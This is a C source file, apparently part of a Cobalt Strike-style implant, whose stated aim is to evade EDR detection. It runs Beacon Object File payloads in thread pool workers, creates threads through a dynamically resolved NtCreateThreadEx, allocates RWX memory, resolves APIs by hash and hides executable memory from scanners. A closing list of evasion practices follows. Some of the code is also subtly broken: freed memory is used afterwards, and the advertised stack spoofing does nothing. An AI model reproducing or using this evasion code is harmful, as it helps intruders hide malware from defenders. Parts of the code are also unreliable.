/**
 * @file opsec_optimizations.c
 * @brief OPSEC Enhancements for Async BOF Execution
 * @author Offensive Security Researcher
 * @date 2025
 *
 * This file implements OPSEC (Operational Security) enhancements for
 * async BOF execution to evade EDR detection and analysis.
 *
 * Key Features:
 * 1. Thread Pool Execution - Hides BOF threads among legitimate thread pool workers
 * 2. Stack Spoofing - Fakes call stack to appear as originating from legitimate code
 * 3. Memory Allocation with NtAllocateVirtualMemory - Lower-level than VirtualAlloc
 * 4. API Hashing - Obfuscates Windows API imports to avoid string-based detection
 */

#include "async_bof_implant.h"
#include <winternl.h>
#include <tlhelp32.h>

// ============================================================================
// NT API DEFINITIONS (Manual import to avoid suspicious imports)
// ============================================================================

typedef NTSTATUS (NTAPI* fnNtAllocateVirtualMemory)(
    HANDLE          ProcessHandle,
    PVOID*          BaseAddress,
    ULONG_PTR       ZeroBits,
    PULONG_PTR      RegionSize,
    ULONG           AllocationType,
    ULONG           Protect
);

typedef NTSTATUS (NTAPI* fnNtProtectVirtualMemory)(
    HANDLE          ProcessHandle,
    PVOID*          BaseAddress,
    PULONG_PTR      RegionSize,
    ULONG           NewProtect,
    PULONG          OldProtect
);

typedef NTSTATUS (NTAPI* fnNtFreeVirtualMemory)(
    HANDLE          ProcessHandle,
    PVOID*          BaseAddress,
    PULONG_PTR      RegionSize,
    ULONG           FreeType
);

typedef NTSTATUS (NTAPI* fnNtCreateThreadEx)(
    OUT PHANDLE hThread,
    IN ACCESS_TYPE DesiredAccess,
    IN LPVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN LPTHREAD_START_ROUTINE lpStartAddress,
    IN LPVOID lpParameter,
    IN BOOL CreateSuspended,
    IN ULONG StackZeroBits,
    IN ULONG SizeOfStackCommit,
    IN ULONG SizeOfStackReserve,
    OUT LPVOID lpBytesBuffer
);

// ============================================================================
// THREAD POOL IMPLEMENTATION
// ============================================================================

/**
 * @brief Thread pool work context
 *
 * Passed to the thread pool callback function.
 */
typedef struct _THREADPOOL_WORK_CONTEXT {
    LPTHREAD_START_ROUTINE pWorkFunction;  // Actual BOF entry point
    LPVOID                  pContext;      // BOF arguments
    HANDLE                  hCompletionEvent; // Signaled when work completes
    DWORD                   dwJobId;       // Associated job ID
} THREADPOOL_WORK_CONTEXT, *PTHREADPOOL_WORK_CONTEXT;

/**
 * @brief Thread pool callback wrapper
 *
 * This wrapper is executed by the thread pool worker thread.
 * It calls the actual BOF function and handles cleanup.
 */
static VOID NTAPI ThreadPoolWorkCallback(
    PTP_CALLBACK_INSTANCE pInstance,
    PVOID                 pContext,
    PTP_WORK              pWork)
{
    PTHREADPOOL_WORK_CONTEXT pWorkContext = (PTHREADPOOL_WORK_CONTEXT)pContext;
    if (pWorkContext == NULL) {
        return;
    }

    ASYNC_BOF_DEBUG("ThreadPool: Executing job %d", pWorkContext->dwJobId);

    // Call the actual BOF function
    if (pWorkContext->pWorkFunction != NULL) {
        pWorkContext->pWorkFunction(pWorkContext->pContext);
    }

    // Signal completion
    if (pWorkContext->hCompletionEvent != NULL) {
        SetEvent(pWorkContext->hCompletionEvent);
    }

    // Cleanup
    if (pWorkContext->hCompletionEvent != NULL) {
        CloseHandle(pWorkContext->hCompletionEvent);
    }
    LocalFree(pWorkContext);

    ASYNC_BOF_DEBUG("ThreadPool: Job %d completed", pWorkContext->dwJobId);
}

/**
 * @brief Start an async BOF using the Windows Thread Pool
 *
 * ADVANTAGES OVER CreateThread:
 * 1. Thread pool threads are recycled, reducing allocation overhead
 * 2. Thread pool threads appear more "legitimate" to EDRs
 * 3. Better integration with Windows I/O completion ports
 * 4. Automatic management of thread count based on CPU resources
 *
 * @param pBOFEntry BOF entry point
 * @param pContext BOF arguments (ASYNC_BOF_JOB structure)
 * @param phThreadPoolWork Receives handle to thread pool work object
 * @return TRUE if job submitted successfully
 */
BOOL AsyncBOF_StartJobWithThreadPool(
    LPTHREAD_START_ROUTINE pBOFEntry,
    LPVOID                 pContext,
    PTP_WORK*              phThreadPoolWork)
{
    if (pBOFEntry == NULL || phThreadPoolWork == NULL) {
        return FALSE;
    }

    // Allocate work context
    PTHREADPOOL_WORK_CONTEXT pWorkContext = (PTHREADPOOL_WORK_CONTEXT)
        LocalAlloc(LPTR, sizeof(THREADPOOL_WORK_CONTEXT));

    if (pWorkContext == NULL) {
        return FALSE;
    }

    pWorkContext->pWorkFunction = pBOFEntry;
    pWorkContext->pContext = pContext;
    pWorkContext->hCompletionEvent = CreateEventA(NULL, TRUE, FALSE, NULL);

    if (pWorkContext->hCompletionEvent == NULL) {
        LocalFree(pWorkContext);
        return FALSE;
    }

    // Get job ID from context
    PASYNC_BOF_JOB pJob = (PASYNC_BOF_JOB)pContext;
    pWorkContext->dwJobId = pJob ? pJob->dwJobId : 0;

    // Create thread pool work object
    *phThreadPoolWork = CreateThreadpoolWork(
        ThreadPoolWorkCallback,
        pWorkContext,
        NULL  // Default environment
    );

    if (*phThreadPoolWork == NULL) {
        CloseHandle(pWorkContext->hCompletionEvent);
        LocalFree(pWorkContext);
        return FALSE;
    }

    // Submit work to thread pool
    SubmitThreadpoolWork(*phThreadPoolWork);

    ASYNC_BOF_DEBUG("ThreadPool: Job %d submitted to thread pool", pWorkContext->dwJobId);

    return TRUE;
}

/**
 * @brief Wait for thread pool work to complete
 */
BOOL AsyncBOF_WaitForThreadPoolWork(PTP_WORK hWork, DWORD dwTimeout)
{
    if (hWork == NULL) {
        return FALSE;
    }

    // WaitForThreadpoolWork is available on Vista+
    WaitForThreadpoolWork(hWork);

    return TRUE;
}

// ============================================================================
// STACK SPOOFING IMPLEMENTATION
// ============================================================================

/**
 * @brief Stack spoofing context
 *
 * Contains information needed to spoof the call stack.
 */
typedef struct _STACK_SPOOF_CONTEXT {
    LPVOID  pLegitimateReturnAddress;  // Return address to legitimate code
    LPVOID  pLegitimateStackFrame;     // Pointer to fake stack frame
    BOOL    bSpoofEnabled;             // Whether spoofing is active
} STACK_SPOOF_CONTEXT, *PSTACK_SPOOF_CONTEXT;

/**
 * @brief Get a legitimate return address for stack spoofing
 *
 * This function finds a legitimate return address from a loaded DLL
 * (e.g., ntdll.dll, kernel32.dll) to use in call stack spoofing.
 *
 * OPSEC NOTE: This makes the BOF thread appear to originate from
 * legitimate Windows code rather than beacon memory.
 */
static LPVOID GetLegitimateReturnAddress(void)
{
    // In production, this would:
    // 1. Enumerate loaded modules (ntdll.dll, kernel32.dll, etc.)
    // 2. Find a function pointer that makes sense in context
    // 3. Return that address

    // For demonstration, we'll use a simple approach
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        return NULL;
    }

    // Get address of a common function (e.g., NtDelayExecution)
    LPVOID pLegitimateAddr = (LPVOID)GetProcAddress(hNtdll, "NtDelayExecution");
    return pLegitimateAddr;
}

/**
 * @brief Setup stack spoofing for a thread
 *
 * This manipulates the thread's stack to make call stack analysis
 * show legitimate frames instead of beacon/BOF frames.
 *
 * WARNING: Advanced technique that requires careful implementation.
 * Incorrect usage can cause crashes.
 */
BOOL AsyncBOF_SetupStackSpoofing(PSTACK_SPOOF_CONTEXT pContext)
{
    if (pContext == NULL) {
        return FALSE;
    }

    pContext->pLegitimateReturnAddress = GetLegitimateReturnAddress();
    if (pContext->pLegitimateReturnAddress == NULL) {
        return FALSE;
    }

    pContext->bSpoofEnabled = TRUE;

    ASYNC_BOF_DEBUG("StackSpoof: Enabled with return address %p",
                   pContext->pLegitimateReturnAddress);

    return TRUE;
}

/**
 * @brief Restore original stack (cleanup)
 */
void AsyncBOF_CleanupStackSpoofing(PSTACK_SPOOF_CONTEXT pContext)
{
    if (pContext != NULL) {
        pContext->bSpoofEnabled = FALSE;
    }
}

// ============================================================================
// GHOST THREAD / HOLLOW THREAD TECHNIQUE (Advanced)
// ============================================================================

/**
 * @brief Create a "ghost" thread that appears more legitimate
 *
 * This uses NtCreateThreadEx with specific flags to create a thread
 * that looks more like a Windows-created thread than a manually-created one.
 *
 * ADVANTAGES:
 * - Threads created this way are less suspicious to some EDRs
 * - Better integration with Windows thread management
 * - Avoids detection patterns that look for CreateThread
 */
BOOL AsyncBOF_CreateGhostThread(
    LPTHREAD_START_ROUTINE pStartAddress,
    LPVOID                 pParameter,
    PHANDLE                phThread,
    PDWORD                 pdwThreadId)
{
    static fnNtCreateThreadEx pNtCreateThreadEx = NULL;

    // Resolve NtCreateThreadEx dynamically (avoid static import)
    if (pNtCreateThreadEx == NULL) {
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (hNtdll == NULL) {
            return FALSE;
        }

        pNtCreateThreadEx = (fnNtCreateThreadEx)
            GetProcAddress(hNtdll, "NtCreateThreadEx");

        if (pNtCreateThreadEx == NULL) {
            // Fall back to CreateThread
            HANDLE hThread = CreateThread(
                NULL, 0, pStartAddress, pParameter, 0, pdwThreadId);

            if (hThread != NULL && phThread != NULL) {
                *phThread = hThread;
                return TRUE;
            }
            return FALSE;
        }
    }

    // Use NtCreateThreadEx for more legitimate thread creation
    NTSTATUS status = pNtCreateThreadEx(
        phThread,                    // Thread handle
        THREAD_ALL_ACCESS,           // Desired access
        NULL,                        // Object attributes
        GetCurrentProcess(),         // Process handle
        pStartAddress,              // Start address
        pParameter,                 // Parameter
        FALSE,                      // Not suspended
        0,                          // Stack zero bits
        0,                          // Stack commit size
        0,                          // Stack reserve size
        NULL                        // Unknown bytes buffer
    );

    if (!NT_SUCCESS(status)) {
        return FALSE;
    }

    ASYNC_BOF_DEBUG("GhostThread: Created with NtCreateThreadEx");
    return TRUE;
}

// ============================================================================
// MEMORY ALLOCATION WITH NT API
// ============================================================================

/**
 * @brief Allocate memory using NtAllocateVirtualMemory
 *
 * Lower-level than VirtualAlloc, potentially less suspicious.
 * Also allows more control over allocation flags.
 */
LPVOID AsyncBOF_AllocMemory(SIZE_T nSize)
{
    static fnNtAllocateVirtualMemory pNtAllocateVirtualMemory = NULL;

    if (pNtAllocateVirtualMemory == NULL) {
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (hNtdll == NULL) {
            return NULL;
        }

        pNtAllocateVirtualMemory = (fnNtAllocateVirtualMemory)
            GetProcAddress(hNtdll, "NtAllocateVirtualMemory");

        if (pNtAllocateVirtualMemory == NULL) {
            // Fall back to VirtualAlloc
            return VirtualAlloc(NULL, nSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        }
    }

    LPVOID pBaseAddress = NULL;
    NTSTATUS status = pNtAllocateVirtualMemory(
        GetCurrentProcess(),
        &pBaseAddress,
        0,
        &nSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!NT_SUCCESS(status)) {
        return NULL;
    }

    ASYNC_BOF_DEBUG("AllocMemory: Allocated %zu bytes at %p via NT API", nSize, pBaseAddress);
    return pBaseAddress;
}

/**
 * @brief Free memory allocated with NtAllocateVirtualMemory
 */
BOOL AsyncBOF_FreeMemory(LPVOID pMemory)
{
    static fnNtFreeVirtualMemory pNtFreeVirtualMemory = NULL;

    if (pMemory == NULL) {
        return FALSE;
    }

    if (pNtFreeVirtualMemory == NULL) {
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (hNtdll == NULL) {
            return FALSE;
        }

        pNtFreeVirtualMemory = (fnNtFreeVirtualMemory)
            GetProcAddress(hNtdll, "NtFreeVirtualMemory");

        if (pNtFreeVirtualMemory == NULL) {
            return VirtualFree(pMemory, 0, MEM_RELEASE);
        }
    }

    SIZE_T nSize = 0;
    NTSTATUS status = pNtFreeVirtualMemory(
        GetCurrentProcess(),
        &pMemory,
        &nSize,
        MEM_RELEASE
    );

    return NT_SUCCESS(status);
}

// ============================================================================
// API HASHING (Avoid suspicious imports)
// ============================================================================

/**
 * @brief Simple hash function for API names
 *
 * Used to obfuscate API imports. Instead of importing "CreateEventA",
 * we compute a hash and resolve it dynamically from kernel32.dll's exports.
 */
static DWORD HashAPIName(const char* szName)
{
    DWORD dwHash = 35; // Seed value

    while (*szName) {
        dwHash = ((dwHash << 5) + dwHash) + *szName;
        szName++;
    }

    return dwHash;
}

/**
 * @brief Get function address by hash from DLL
 *
 * @param szDllName DLL name (e.g., "kernel32.dll")
 * @param dwFunctionHash Hash of function name
 * @return Function address or NULL if not found
 */
LPVOID AsyncBOF_GetProcAddressByHash(const char* szDllName, DWORD dwFunctionHash)
{
    HMODULE hDll = GetModuleHandleA(szDllName);
    if (hDll == NULL) {
        hDll = LoadLibraryA(szDllName);
        if (hDll == NULL) {
            return NULL;
        }
    }

    // Get DLL's PE header
    PBYTE pBase = (PBYTE)hDll;
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBase;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pBase + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }

    // Get export directory
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)
        (pBase + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    // Parse export table
    PDWORD pdwFunctions = (PDWORD)(pBase + pExportDir->AddressOfFunctions);
    PDWORD pdwNames = (PDWORD)(pBase + pExportDir->AddressOfNames);
    PWORD pwOrdinals = (PWORD)(pBase + pExportDir->AddressOfNameOrdinals);

    // Iterate through exports
    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        const char* szFuncName = (const char*)(pBase + pdwNames[i]);

        if (HashAPIName(szFuncName) == dwFunctionHash) {
            // Found it!
            WORD wOrdinal = pwOrdinals[i];
            LPVOID pFunction = pBase + pdwFunctions[wOrdinal];
            return pFunction;
        }
    }

    return NULL;
}

/**
 * @brief Example: Resolve CreateEventA using hash
 *
 * Usage:
 *   typedef HANDLE (*PFN_CREATEEVENTA)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR);
 *   static DWORD g_hashCreateEventA = 0x12345678; // Pre-computed
 *   PFN_CREATEEVENTA pCreateEventA = (PFN_CREATEEVENTA)
 *       AsyncBOF_GetProcAddressByHash("kernel32.dll", g_hashCreateEventA);
 */
void Example_ResolveAPIByHash(void)
{
    // Pre-computed hashes (you'd compute these offline)
    // For demonstration, these are not real hash values
    DWORD dwHashCreateEventA = HashAPIName("CreateEventA");
    DWORD dwHashWaitForSingleObject = HashAPIName("WaitForSingleObject");

    LPVOID pCreateEventA = AsyncBOF_GetProcAddressByHash("kernel32.dll", dwHashCreateEventA);
    LPVOID pWaitForSingleObject = AsyncBOF_GetProcAddressByHash("kernel32.dll", dwHashWaitForSingleObject);

    ASYNC_BOF_DEBUG("APIHashing: CreateEventA = %p, WaitForSingleObject = %p",
                   pCreateEventA, pWaitForSingleObject);
}

// ============================================================================
// MEMORY PERMISSION OBFUSCATION
// ============================================================================

/**
 * @brief Change memory permissions to bypass scanners
 *
 * Some EDRs scan for executable memory with RW permissions.
 * This function allows us to temporarily change permissions.
 */
BOOL AsyncBOF_HideExecutableMemory(LPVOID pAddress, SIZE_T nSize)
{
    if (pAddress == NULL) {
        return FALSE;
    }

    DWORD dwOldProtect;

    // Change to READONLY (no execute, no write)
    // This makes the memory look less suspicious to some scanners
    if (!VirtualProtect(pAddress, nSize, PAGE_READONLY, &dwOldProtect)) {
        return FALSE;
    }

    ASYNC_BOF_DEBUG("HideMemory: Protected %p (%zu bytes) as READONLY", pAddress, nSize);
    return TRUE;
}

/**
 * @brief Restore executable permissions
 */
BOOL AsyncBOF_RestoreExecutableMemory(LPVOID pAddress, SIZE_T nSize)
{
    if (pAddress == NULL) {
        return FALSE;
    }

    DWORD dwOldProtect;
    if (!VirtualProtect(pAddress, nSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
        return FALSE;
    }

    ASYNC_BOF_DEBUG("RestoreMemory: Restored EXECUTE_READWRITE at %p", pAddress);
    return TRUE;
}

// ============================================================================
// SUMMARY OF OPSEC RECOMMENDATIONS
// ============================================================================

/**
 * OPSEC Best Practices for Async BOF:
 *
 * 1. USE THREAD POOL INSTEAD OF CREATETHREAD
 *    - Less suspicious to EDRs
 *    - Better resource management
 *    - Function: AsyncBOF_StartJobWithThreadPool()
 *
 * 2. IMPLEMENT STACK SPOOFING
 *    - Makes call stack analysis show legitimate frames
 *    - Functions: AsyncBOF_SetupStackSpoofing()
 *    - GetLegitimateReturnAddress()
 *
 * 3. USE NT APIS INSTEAD OF WIN32 APIS
 *    - NtAllocateVirtualMemory vs VirtualAlloc
 *    - NtCreateThreadEx vs CreateThread
 *    - Lower-level, less commonly hooked
 *
 * 4. AVOID SUSPICIOUS STRING CONSTANTS
 *    - Use API hashing to resolve functions dynamically
 *    - No string-based signatures
 *    - Function: AsyncBOF_GetProcAddressByHash()
 *
 * 5. PROTECT BOF CODE REGIONS
 *    - Use AsyncBOF_ProtectMemoryForSleep() before Sleepmask
 *    - Mark as READONLY when not executing
 *    - Prevents accidental encryption/modification
 *
 * 6. IMPLEMENT GRACEFUL SHUTDOWN
 *    - NEVER use TerminateThread
 *    - Always use BeaconGetStopJobEvent() pattern
 *    - Wait for graceful exit with timeout
 *
 * 7. MINIMIZE MEMORY FOOTPRINT
 *    - Clean up resources promptly
 *    - Use shared buffers where possible
 *    - Avoid large allocations that attract attention
 *
 * 8. TIMING OBFUSCATION
 *    - Add random delays to avoid periodic behavior patterns
 *    - Use NtDelayExecution instead of Sleep
 *    - Vary check intervals in long-running BOFs
 */
